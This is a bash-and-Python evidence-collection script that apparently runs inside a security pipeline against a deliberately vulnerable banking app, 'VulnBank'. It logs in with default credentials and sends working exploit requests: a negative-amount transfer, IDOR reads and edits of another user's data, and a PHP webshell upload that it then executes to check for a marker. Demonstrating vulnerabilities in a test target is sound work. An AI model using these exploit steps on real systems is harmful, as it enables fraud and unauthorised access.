#!/usr/bin/env bash
set -euo pipefail

require_env() {
  local name="$1"
  if [[ -z "${!name:-}" ]]; then
    echo "ERROR: required environment variable is not set: ${name}" >&2
    exit 1
  fi
}

require_cmd() {
  local name="$1"
  if ! command -v "${name}" >/dev/null 2>&1; then
    echo "ERROR: required command not found: ${name}" >&2
    exit 1
  fi
}

json_value() {
  local file="$1"
  local key="$2"
  python3 - "${file}" "${key}" <<'PY'
import json
import sys

path = sys.argv[1]
key = sys.argv[2]
try:
    with open(path, "r", encoding="utf-8") as fh:
        data = json.load(fh)
except Exception:
    sys.exit(0)
value = data
for part in key.split("."):
    if isinstance(value, dict) and part in value:
        value = value[part]
    else:
        sys.exit(0)
if value is not None:
    print(value)
PY
}

header_value() {
  local file="$1"
  local name="$2"
  awk -v key="${name}" '
    tolower(substr($0, 1, length(key) + 1)) == tolower(key ":") {
      sub("^[^:]+:[[:space:]]*", "", $0)
      gsub("\r", "", $0)
      print $0
      exit
    }
  ' "${file}"
}

write_request() {
  local file="$1"
  shift
  printf '%s\n' "$@" > "${file}"
}

http_post_form() {
  local name="$1"
  local path="$2"
  local request_file="${EVIDENCE_DIR}/${name}.request.txt"
  local response_file="${EVIDENCE_DIR}/${name}.response.json"
  local headers_file="${EVIDENCE_DIR}/${name}.headers.txt"
  local code_file="${EVIDENCE_DIR}/${name}.status"
  shift 2
  write_request "${request_file}" "POST ${FRONTEND_URL}${path}" "$@"
  local code
  local curl_exit
  set +e
  code="$(
    curl -sS \
      -D "${headers_file}" \
      -o "${response_file}" \
      -w "%{http_code}" \
      -X POST \
      "$@" \
      "${FRONTEND_URL}${path}"
  )"
  curl_exit="$?"
  set -e
  if [[ "${curl_exit}" != "0" ]]; then
    echo "curl_exit=${curl_exit}" >> "${response_file}"
    code="000"
  fi
  echo "${code}" > "${code_file}"
  echo "${response_file}"
}

http_get() {
  local name="$1"
  local path="$2"
  local request_file="${EVIDENCE_DIR}/${name}.request.txt"
  local response_file="${EVIDENCE_DIR}/${name}.response.txt"
  local headers_file="${EVIDENCE_DIR}/${name}.headers.txt"
  local code_file="${EVIDENCE_DIR}/${name}.status"
  write_request "${request_file}" "GET ${FRONTEND_URL}${path}"
  local code
  local curl_exit
  set +e
  code="$(
    curl -sS \
      -D "${headers_file}" \
      -o "${response_file}" \
      -w "%{http_code}" \
      "${FRONTEND_URL}${path}"
  )"
  curl_exit="$?"
  set -e
  if [[ "${curl_exit}" != "0" ]]; then
    echo "curl_exit=${curl_exit}" >> "${response_file}"
    code="000"
  fi
  echo "${code}" > "${code_file}"
  echo "${response_file}"
}

wait_for_frontend() {
  local url="$1"
  local attempts="${2:-30}"
  local index
  for index in $(seq 1 "${attempts}"); do
    if curl -fsS "${url}/" >/dev/null 2>&1; then
      return 0
    fi
    sleep 1
  done
  return 1
}

start_port_forward_if_needed() {
  if [[ -n "${FRONTEND_URL:-}" ]]; then
    return 0
  fi

  FRONTEND_SERVICE="${FRONTEND_SERVICE:-${APP_NAME}-frontend}"
  FRONTEND_LOCAL_PORT="${FRONTEND_LOCAL_PORT:-18080}"

  if command -v kubectl >/dev/null 2>&1 && kubectl get service "${FRONTEND_SERVICE}" -n "${NAMESPACE}" >/dev/null 2>&1; then
    kubectl -n "${NAMESPACE}" port-forward "svc/${FRONTEND_SERVICE}" "${FRONTEND_LOCAL_PORT}:8080" > "${EVIDENCE_DIR}/port-forward.log" 2>&1 &
    PORT_FORWARD_PID="$!"
    FRONTEND_URL="http://127.0.0.1:${FRONTEND_LOCAL_PORT}"
    if wait_for_frontend "${FRONTEND_URL}" 30; then
      echo "Started kubectl port-forward for ${FRONTEND_SERVICE} at ${FRONTEND_URL}" > "${EVIDENCE_DIR}/frontend-url.txt"
      return 0
    fi
    echo "ERROR: frontend port-forward started but endpoint did not become ready: ${FRONTEND_URL}" >&2
    return 1
  fi

  FRONTEND_URL="http://localhost:8080"
  echo "WARN: FRONTEND_URL was not set and kubectl service lookup failed. Falling back to ${FRONTEND_URL}" > "${EVIDENCE_DIR}/frontend-url.txt"
}

cleanup() {
  if [[ -n "${PORT_FORWARD_PID:-}" ]]; then
    kill "${PORT_FORWARD_PID}" >/dev/null 2>&1 || true
  fi
}

require_env REPORT_DIR
require_env WORKLOAD_NAME
require_env APP_NAME
require_env SERVICES
require_env NAMESPACE
require_env DEPLOY_MODE
require_env IMAGE_TAG
require_cmd curl
require_cmd python3
require_cmd awk
require_cmd sed

EVIDENCE_DIR="${REPORT_DIR}/evidence"
mkdir -p "${REPORT_DIR}/kubernetes" "${REPORT_DIR}/events" "${EVIDENCE_DIR}"
PORT_FORWARD_PID=""
trap cleanup EXIT

git_sha="$(git rev-parse --short HEAD 2>/dev/null || true)"

{
  echo "BUILD_NUMBER=${BUILD_NUMBER:-unknown}"
  echo "GIT_SHA=${git_sha:-unknown}"
  echo "WORKLOAD_NAME=${WORKLOAD_NAME}"
  echo "APP_NAME=${APP_NAME}"
  echo "SERVICES=${SERVICES}"
  echo "IMAGE_TAG=${IMAGE_TAG}"
  echo "NAMESPACE=${NAMESPACE}"
  echo "DEPLOY_MODE=${DEPLOY_MODE}"
  echo "REPORT_DIR=${REPORT_DIR}"
} > "${REPORT_DIR}/metadata.txt"

if command -v kubectl >/dev/null 2>&1; then
  kubectl get pods -n "${NAMESPACE}" -o wide > "${REPORT_DIR}/kubernetes/pods.txt" 2>&1 || true
  kubectl get services -n "${NAMESPACE}" -o wide > "${REPORT_DIR}/kubernetes/services.txt" 2>&1 || true
  kubectl get deployments -n "${NAMESPACE}" -o wide > "${REPORT_DIR}/kubernetes/deployments.txt" 2>&1 || true
  kubectl describe pods -n "${NAMESPACE}" > "${REPORT_DIR}/events/pod-describe.txt" 2>&1 || true
  kubectl get events -n "${NAMESPACE}" --sort-by=.lastTimestamp > "${REPORT_DIR}/events/image-pull-events.txt" 2>&1 || true
fi

start_port_forward_if_needed
echo "${FRONTEND_URL}" > "${EVIDENCE_DIR}/frontend-url.txt"

set +e
FRONTEND_URL="${FRONTEND_URL}" scripts/test-msa-integration.sh > "${EVIDENCE_DIR}/integration-test.stdout.log" 2> "${EVIDENCE_DIR}/integration-test.stderr.log"
integration_exit="$?"
set -e
echo "${integration_exit}" > "${EVIDENCE_DIR}/integration-test.exit-code"

LOGIN_USERNAME="${LOGIN_USERNAME:-j.doe}"
LOGIN_PASSWORD="${LOGIN_PASSWORD:-password}"
TRANSFER_SENDER="${TRANSFER_SENDER:-DE12345123451234512345}"
TRANSFER_RECIPIENT="${TRANSFER_RECIPIENT:-DE00000111112222233333}"
IDOR_ACCOUNT="${IDOR_ACCOUNT:-DE00000111112222233333}"
NEGATIVE_AMOUNT="${NEGATIVE_AMOUNT:--10}"
IDOR_TARGET_ID="${IDOR_TARGET_ID:-2}"
WEBSHELL_FILENAME="${WEBSHELL_FILENAME:-msa-evidence-webshell.php}"
WEBSHELL_MARKER="${WEBSHELL_MARKER:-VULNBANK_MSA_EVIDENCE_WEBSHELL_OK}"

login_body="$(
  http_post_form "01-login" "/api/v1/auth/login" \
    --data-urlencode "username=${LOGIN_USERNAME}" \
    --data-urlencode "password=${LOGIN_PASSWORD}"
)"
token="$(json_value "${login_body}" "token")"
echo "${token}" > "${EVIDENCE_DIR}/token.txt"

negative_transfer_body="$(
  http_post_form "02-negative-transfer" "/api/v1/transactions/transfer" \
    -H "Authorization: Bearer ${token}" \
    --data-urlencode "sender=${TRANSFER_SENDER}" \
    --data-urlencode "recipient=${TRANSFER_RECIPIENT}" \
    --data-urlencode "amount=${NEGATIVE_AMOUNT}" \
    --data-urlencode "comment=msa-evidence-negative-transfer"
)"

idor_history_body="$(
  http_post_form "03-idor-transaction-history" "/api/v1/transactions/history" \
    -H "Authorization: Bearer ${token}" \
    --data-urlencode "account_number=${IDOR_ACCOUNT}"
)"

idor_update_body="$(
  http_post_form "04-idor-user-update" "/api/v1/settings/infoupdate" \
    -H "Authorization: Bearer ${token}" \
    --data-urlencode "id=${IDOR_TARGET_ID}" \
    --data-urlencode "firstname=Jack" \
    --data-urlencode "lastname=Adams" \
    --data-urlencode "phone=15559999" \
    --data-urlencode "email=j.adams.evidence@example.test" \
    --data-urlencode "birthdate=1990-05-05" \
    --data-urlencode "about=changed-by-msa-evidence"
)"

webshell_file="${EVIDENCE_DIR}/${WEBSHELL_FILENAME}"
printf '%s\n' "<?php echo '${WEBSHELL_MARKER}'; ?>" > "${webshell_file}"
upload_request="${EVIDENCE_DIR}/05-webshell-upload.request.txt"
upload_body="${EVIDENCE_DIR}/05-webshell-upload.response.json"
upload_headers="${EVIDENCE_DIR}/05-webshell-upload.headers.txt"
upload_code_file="${EVIDENCE_DIR}/05-webshell-upload.status"
write_request "${upload_request}" "POST ${FRONTEND_URL}/api/v1/files/upload" "Authorization: Bearer <redacted>" "id=1" "upload_avatar=@${webshell_file};filename=${WEBSHELL_FILENAME};type=application/x-php"
set +e
upload_code="$(
  curl -sS \
    -D "${upload_headers}" \
    -o "${upload_body}" \
    -w "%{http_code}" \
    -X POST \
    -H "Authorization: Bearer ${token}" \
    -F "id=1" \
    -F "upload_avatar=@${webshell_file};filename=${WEBSHELL_FILENAME};type=application/x-php" \
    "${FRONTEND_URL}/api/v1/files/upload"
)"
upload_curl_exit="$?"
set -e
if [[ "${upload_curl_exit}" != "0" ]]; then
  echo "curl_exit=${upload_curl_exit}" >> "${upload_body}"
  upload_code="000"
fi
echo "${upload_code}" > "${upload_code_file}"
uploaded_source="$(json_value "${upload_body}" "source")"
echo "${uploaded_source}" > "${EVIDENCE_DIR}/uploaded-source.txt"

webshell_exec_body="${EVIDENCE_DIR}/06-webshell-exec.response.txt"
if [[ -n "${uploaded_source}" ]]; then
  http_get "06-webshell-exec" "/vulnbank/online/${uploaded_source}" >/dev/null
fi

python3 - "${EVIDENCE_DIR}" "${REPORT_DIR}" "${integration_exit}" "${token}" "${WEBSHELL_MARKER}" <<'PY'
import json
import os
import sys

evidence_dir = sys.argv[1]
report_dir = sys.argv[2]
integration_exit = int(sys.argv[3])
token = sys.argv[4]
marker = sys.argv[5]

def read_text(name):
    path = os.path.join(evidence_dir, name)
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read()
    except FileNotFoundError:
        return ""

def read_json(name):
    text = read_text(name)
    try:
        return json.loads(text)
    except Exception:
        return {"raw": text}

def read_status(name):
    text = read_text(name).strip()
    try:
        return int(text)
    except Exception:
        return 0

negative = read_json("02-negative-transfer.response.json")
history = read_json("03-idor-transaction-history.response.json")
update = read_json("04-idor-user-update.response.json")
upload = read_json("05-webshell-upload.response.json")
webshell_output = read_text("06-webshell-exec.response.txt")

checks = {
    "integration_test": integration_exit == 0,
    "login_token_issued": bool(token),
    "negative_transfer_accepted": read_status("02-negative-transfer.status") in range(200, 400) and negative.get("status") == "success",
    "idor_transaction_history_exposed": read_status("03-idor-transaction-history.status") in range(200, 400) and history.get("status") == "success" and bool(history.get("transactions")),
    "idor_user_update_accepted": read_status("04-idor-user-update.status") in range(200, 400) and update.get("status") == "success",
    "webshell_upload_accepted": read_status("05-webshell-upload.status") in range(200, 400) and upload.get("status") == "success" and bool(upload.get("source")),
    "webshell_execution_marker_seen": marker in webshell_output,
}

document = {
    "schema": "secure-k8s-delivery-path.msa-vulnerability-evidence.v1",
    "report_dir": report_dir,
    "frontend_url": read_text("frontend-url.txt").strip(),
    "token_present": bool(token),
    "checks": checks,
    "artifacts": {
        "integration_stdout": os.path.join(evidence_dir, "integration-test.stdout.log"),
        "integration_stderr": os.path.join(evidence_dir, "integration-test.stderr.log"),
        "login_response": os.path.join(evidence_dir, "01-login.response.json"),
        "negative_transfer_response": os.path.join(evidence_dir, "02-negative-transfer.response.json"),
        "idor_transaction_history_response": os.path.join(evidence_dir, "03-idor-transaction-history.response.json"),
        "idor_user_update_response": os.path.join(evidence_dir, "04-idor-user-update.response.json"),
        "webshell_upload_response": os.path.join(evidence_dir, "05-webshell-upload.response.json"),
        "webshell_exec_response": os.path.join(evidence_dir, "06-webshell-exec.response.txt"),
    },
    "responses": {
        "negative_transfer": negative,
        "idor_transaction_history": history,
        "idor_user_update": update,
        "webshell_upload": upload,
        "webshell_exec": webshell_output,
    },
}

with open(os.path.join(evidence_dir, "msa-vulnerability-evidence.json"), "w", encoding="utf-8") as fh:
    json.dump(document, fh, indent=2, ensure_ascii=False)

with open(os.path.join(evidence_dir, "summary.txt"), "w", encoding="utf-8") as fh:
    fh.write("MSA Vulnerability Evidence Summary\n")
    fh.write(f"Frontend URL: {document['frontend_url']}\n")
    fh.write(f"Integration test exit code: {integration_exit}\n")
    for key, value in checks.items():
        fh.write(f"{key}: {'PASS' if value else 'FAIL'}\n")

if not all(checks.values()):
    sys.exit(1)
PY

find "${REPORT_DIR}" -type f | sort > "${REPORT_DIR}/evidence-files.txt"

cat > "${REPORT_DIR}/evidence-map.md" <<EOF
# Evidence Map

- Build Number: ${BUILD_NUMBER:-unknown}
- Git SHA: ${git_sha:-unknown}
- Workload Name: ${WORKLOAD_NAME}
- App Name: ${APP_NAME}
- Services: ${SERVICES}
- Image Tag: ${IMAGE_TAG}
- Namespace: ${NAMESPACE}
- Deploy Mode: ${DEPLOY_MODE}
- Gate Result: see \`${REPORT_DIR}/gate/msa-gate-summary.txt\`
- Kubernetes Status: see \`${REPORT_DIR}/kubernetes/\`
- Helm Status: see \`${REPORT_DIR}/helm/status.txt\` when DEPLOY_MODE=helm
- ArgoCD Status: see \`${REPORT_DIR}/argocd/app-status.txt\` when DEPLOY_MODE=argocd
- MSA Vulnerability Evidence JSON: \`${EVIDENCE_DIR}/msa-vulnerability-evidence.json\`
- MSA Vulnerability Evidence Summary: \`${EVIDENCE_DIR}/summary.txt\`
- Evidence Path: ${REPORT_DIR}
EOF

echo "MSA evidence collected in ${REPORT_DIR}"
